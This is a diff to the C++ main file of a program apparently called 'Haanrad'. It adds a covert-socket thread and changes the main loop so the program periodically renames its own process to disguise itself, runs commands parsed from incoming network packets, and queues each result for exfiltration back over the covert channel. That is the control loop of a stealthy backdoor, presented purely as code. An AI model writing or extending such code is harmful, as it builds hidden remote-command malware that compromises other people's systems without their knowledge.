@@ -22,6 +22,11 @@ void * networkMonitorThreadBootstrapper(void * networkMonitorThread){
     nmt->start();
 }
 
+void * covertSocketThreadBootstrapper(void * covertSocketThread){
+    CovertSocketThread * cst = (CovertSocketThread *)covertSocketThread;
+    cst->start();
+}
+
 string parseOutDNSQuery(PacketMeta meta){
 
     if(meta.applicationType != ApplicationType::DNS){
@@ -149,10 +154,14 @@ int main(int argc, char * argv[]) {
     NetworkMonitorThread * networkMonitorThread = new NetworkMonitorThread(networkMonitor, executorQueue);
     pthread_t nmt;
     pthread_create(&nmt, NULL, &networkMonitorThreadBootstrapper, networkMonitorThread);
-
     Logger::debug("Main - NetworkMonitorThread Launched");
 
-
+    Logger::debug("Main - Creating CovertSocket Thread. Starting...");
+    CovertSocketQueue * covertSocketQueue = new CovertSocketQueue();
+    CovertSocketThread * covertSocketThread = new CovertSocketThread(covertSocketQueue, covertSocket);
+    pthread_t cst;
+    pthread_create(&cst, NULL, &covertSocketThreadBootstrapper, covertSocketThread);
+    Logger::debug("Main - CovertSocketThread Launched");
     //use this thread to cycle through:
     // 1) ProcessDistorter
     // 2) SystemState Evaluations
@@ -160,9 +169,12 @@ int main(int argc, char * argv[]) {
 
     while(1){
         //hang on timer tick
+        sleep(5);
 
         //rename process
         processDistorter->determineProcessName();
+
+        sleep(5);
 
         //hang on timer tick
 
@@ -179,10 +191,11 @@ int main(int argc, char * argv[]) {
             if(message.interMessageCode == InterClientMessageType::ERROR){
                 Logger::debug("Main - There Was An Error Parsing The Haanrad Packet. Can't Execute");
             }else{
-                string response = Executor::execute(message);
-
-
-
+                Logger::debug("Main - Parsing Successful. Now Executing");
+                string haanradPacket = Executor::execute(message);
+                Logger::debug("Main - Execution Complete. Adding To Queue To Send Back");
+                covertSocketQueue->addPacketToSend(haanradPacket);
+                Logger::debug("Main - Adding To CovertSocketQueue Complete");
             }
         }
 
